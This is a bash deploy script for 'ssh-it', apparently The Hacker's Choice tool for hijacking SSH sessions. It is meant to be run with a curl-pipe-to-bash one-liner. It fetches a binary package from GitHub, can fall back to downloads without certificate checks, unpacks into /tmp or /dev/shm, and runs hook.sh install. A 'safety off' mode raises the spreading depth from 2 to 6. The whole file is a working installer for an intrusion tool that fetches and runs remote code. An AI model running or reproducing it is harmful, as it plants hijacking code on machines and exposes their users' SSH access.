#! /usr/bin/env bash

# Install and configure ssh-it
#
# See https://www.thc.org/ssh-it/ for more details.
#
# This script is typically invoked likes this:
# 	$ bash -c "$(curl -fsSL thc.org/ssh-it/x)"


URL_BASE="https://github.com/hackerschoice/binary/raw/main/ssh-it/"
URL_DEPLOY="ssh-it.thc.org/x"
DL_CRL="bash -c \"\$(curl -fsSL $URL_DEPLOY)\""
DL_WGT="bash -c \"\$(wget -qO- $URL_DEPLOY)\""
PKG_NAME="ssh-it-pkg"
PKG_TGZ="${PKG_NAME}.tar.gz"
PKG_DIR="ssh-it-pkg"

CY="\033[1;33m" # yellow
CG="\033[1;32m" # green
CR="\033[1;31m" # red
CC="\033[1;36m" # cyan
CM="\033[1;35m" # magenta
CN="\033[0m"    # none

# Defaults for 'safety off' (THC_NO_CONDOME)
_DEFAULT_NOCO_THC_DEPTH=6
_DEFAULT_NOCO_THC_VERBOSE=

# While in PoC/Alpha phase we use some different defaults for testing & debugging
_DEFAULT_THC_DEPTH=2
_DEFAULT_THC_VERBOSE=1
_DEFAULT_THC_TESTING=1
# _DEFAULT_THC_TESTING=


if [[ -z $THC_DEBUG ]]; then
	DEBUGF(){ :;}
else
	DEBUGF(){ echo -e "${CY}DEBUG:${CN} $*";}
fi

clean()
{
	DEBUGF "Cleaning '${MY_TMPDIR}'"
	rm -rf "${MY_TMPDIR:?}" &>/dev/null
}

errexit()
{
	[[ -z "$1" ]] || echo -e 1>&2 "${CR}$*${CN}"

	clean
	exit 255
}

OK_OUT()
{
	echo -e 2>&1 "......[${CG}OK${CN}]"
	[[ -n "$1" ]] && echo -e 1>&2 "--> $*"
}

FAIL_OUT()
{
	echo -e 1>&2 "..[${CR}FAILED${CN}]"
	[[ -n "$1" ]] && echo -e 1>&2 "--> $*"
}

WARN()
{
	echo -e 1>&2 "--> ${CY}WARNING: ${CN}$*"
}

# Directory (/-terminated), e.g. "/tmp/"
# Find a writeable temporary directory
# Examples:
# 	try_tmpdir "/tmp/"
# 	try_tmpdir "/dev/shm/" 
try_tmpdir()
{
	local dir
	[[ -z $1 ]] && return
	[[ -n $MY_TMPDIR ]] && return  # already set
	[[ ! -d "${1}" ]] && return

	dir="${1}.${PKG_NAME}-${UID}"
	[[ ! -d "${dir}" ]] && mkdir -p "${dir}" 2>/dev/null
	[[ ! -d "${dir}" ]] && return

	MY_TMPDIR="${dir}"
}

init_vars()
{
	local is_set_thc_verbose
	local is_set_thc_depth
	local is_set_thc_recheck_time
	local is_set_thc_testing

	[[ -n THC_VERBOSE ]] && is_set_thc_verbose=1
	[[ -n THC_DEPTH ]] && is_set_thc_depth=1
	[[ -n THC_TESTING ]] && is_set_thc_testing=1

	if [[ -n $THC_NO_CONDOME ]]; then
		# HERE: Remove all safety limits
		[[ -n $is_set_thc_verbose ]] && THC_VERBOSE="${_DEFAULT_NOCO_THC_VERBOSE}"
		[[ -n $is_set_thc_depth ]] && THC_DEPTH="${_DEFAULT_NOCO_THC_DEPTH}"
		[[ -n $is_set_thc_testing ]] && unset THC_TESTING
	else
		[[ -n $is_set_thc_depth ]] && THC_DEPTH="${_DEFAULT_THC_DEPTH}"
		[[ -n $is_set_thc_testing ]] && THC_TESTING="${_DEFAULT_THC_TESTING}"
	fi

	[[ -n $THC_NO_VERBOSE ]] && unset THC_VERBOSE

	if [[ -n $THC_DEBUG ]]; then
		# [[ -z $THC_NO_USELOCAL ]] && THC_USELOCAL=1
		# [[ -z $THC_NO_VERBOSE ]] && THC_VERBOSE=1
		:
	fi

	try_tmpdir "${TMPDIR}"
	try_tmpdir "/tmp/"
	try_tmpdir "${HOME}/"
	try_tmpdir "/dev/shm/"

	rm -f "${MY_TMPDIR}/${PKG_NAME}" 2>/dev/null
	rm -f "${MY_TMPDIR}/${PKG_TGZ}" 2>/dev/null

	command -v tar >/dev/null || errexit "Need tar. Try ${CM}apt install tar${CN}"
	rm -rf "${PKG_DIR:-/dev/null}" 2>/dev/null
	mkdir "${PKG_DIR}" 2>/dev/null || errexit "Permission denied: mkdir ${PKGDIR}"
	rm -rf "${PKG_DIR:-/dev/null}" 2>/dev/null

	DEBUGF "THC_VERBOSE    = ${THC_VERBOSE}"
	DEBUGF "THC_TESTING    = ${THC_TESTING}"
	DEBUGF "THC_DEPTH      = ${THC_DEPTH}"
	DEBUGF "THC_DEBUG      = ${THC_DEBUG}"
	DEBUGF "THC_USELOCAL   = ${THC_USELOCAL}"
	DEBUGF "MY_TMPDIR      = ${MY_TMPDIR}"
}

ask_nocertcheck()
{
	WARN "Can not verify host. CA Bundle is not installed."
	echo "--> Attempting without certificate verification."
	echo "--> Press any key to continue or CTRL-C to abort..."
	echo -en 1>&2 -en "--> Continuing in "
	local n

	n=10
	while :; do
		echo -en 1>&2 "${n}.."
		n=$((n-1))
		[[ $n -eq 0 ]] && break 
		read -r -t1 -n1 && break
	done
	[[ $n -gt 0 ]] || echo 1>&2 "0"

	THC_NOCERTCHECK=1
}

# Use SSL and if this fails try non-ssl (if user consents to insecure downloads)
# <nocert-param> <ssl-match> <cmd> <param-url> <url> <param-dst> <dst> 
dl_ssl()
{
	DL_LOG="${5}"$'\n' # URL
	if [[ -z $THC_NOCERTCHECK ]]; then
		DL_LOG+=$("$3" "$4" "$5" "$6" "$7" 2>&1)
		[[ "${DL_LOG}" != *"$2"* ]] && return
	fi

	if [[ -z $THC_NOCERTCHECK ]]; then
		SKIP_OUT
		ask_nocertcheck
	fi
	[[ -z $THC_NOCERTCHECK ]] && return

	echo -en 2>&1 "Downloading binaries without certificate verification................."
	DL_LOG+=$("$3" "$1" "$4" "$5" "$6" "$7" 2>&1)
}

# Download $1 and save it to $2
dl()
{
	[[ -s "$2" ]] && return

	# Need to set DL_CMD before GS_DEBUG check for proper error output
	if [[ -n "$THC_USELOCAL" ]]; then
		DL_CMD="./deploy.sh"
	elif command -v curl >/dev/null; then
		DL_CMD="$DL_CRL"
	elif command -v wget >/dev/null; then
		DL_CMD="$DL_WGT"
	else
		# errexit "Need curl or wget."
		FAIL_OUT "Need curl or wget. Try ${CM}apt install curl${CN}"
		errexit
	fi

	# Debugging / testing. Use local package if available
	if [[ -n "$THC_USELOCAL" ]]; then
		[[ -f "${1}" ]] && cp "${1}" "${2}" 2>/dev/null && return
		[[ -f "../packaging/${1}" ]] && cp "../packaging/${1}" "${2}" 2>/dev/null && return
		FAIL_OUT "THC_USELOCAL set but deployment binaries not found (${1})..."
		errexit
	fi

	if [[ "$DL_CMD" == "$DL_CRL" ]]; then
		dl_ssl "-k" "certificate problem" "curl" "-fL" "${URL_BASE}/${1}" "--output" "${2}"
	elif [[ "$DL_CMD" == "$DL_WGT" ]]; then
		dl_ssl "--no-check-certificate" "is not trusted" "wget" "" "${URL_BASE}/${1}" "-O" "${2}"
	else
		# errexit "Need curl or wget."
		FAIL_OUT "CAN NOT HAPPEN"
		errexit
	fi

	[[ ! -s "$2" ]] && { FAIL_OUT; echo "$DL_LOG"; errexit; } 
}

init_vars

echo -en 2>&1 "Downloading binaries.................................................."
dl "${PKG_TGZ}" "${MY_TMPDIR}/${PKG_TGZ}"
OK_OUT

echo -en 2>&1 "Unpacking binaries...................................................."
# Unpack (suppress "tar: warning: skipping header 'x'" on alpine linux
(cd "${MY_TMPDIR}" && tar xfz "${PKG_TGZ}" 2>/dev/null) || { FAIL_OUT "unpacking failed"; errexit; }
[[ ! -f "${MY_TMPDIR}/${PKG_NAME}/hook.sh" ]] && { FAIL_OUT "unpacking failed"; errexit; }
OK_OUT

export THC_DEBUG
export THC_VERBOSE
export THC_TESTING
export THC_DEPTH
(cd "${MY_TMPDIR}/${PKG_NAME}" && "./hook.sh" install) || errexit;

clean
exit

